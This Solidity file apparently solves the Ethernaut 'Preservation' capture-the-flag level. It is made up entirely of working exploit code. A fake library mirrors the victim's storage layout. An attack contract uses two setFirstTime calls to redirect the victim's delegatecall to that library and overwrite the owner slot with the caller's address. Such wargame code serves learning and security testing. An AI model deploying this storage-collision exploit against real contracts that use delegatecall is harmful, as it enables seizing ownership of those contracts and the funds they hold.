// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

contract FakeTimeZoneLibrary {
    uint256 dummy1;
    uint256 dummy2;
    address public owner;

    function setTime(uint addressPretendedToBeATime) public {
        owner = tx.origin;
    }
}

contract PreservationAttack {
    address target;
    FakeTimeZoneLibrary fakeTimeZoneLibrary;

    constructor(address _target, address _fakeTimeZoneLibrary) {
        target = _target;
        fakeTimeZoneLibrary = FakeTimeZoneLibrary(_fakeTimeZoneLibrary);
        console.log("target: ", target);
        console.log("fakeTimeZoneLibrary:", _fakeTimeZoneLibrary);
    }

    function attack() public {
        (bool success1, ) = target.call(
            abi.encodeWithSignature(
                "setFirstTime(uint256)",
                uint256((uint160(address(fakeTimeZoneLibrary))))
            )
        );

        require(success1, "Attack failed");

        (bool success2, ) = target.call(
            abi.encodeWithSignature("setFirstTime(uint256)", 0)
        );
        require(success2, "Attack failed");
    }
}
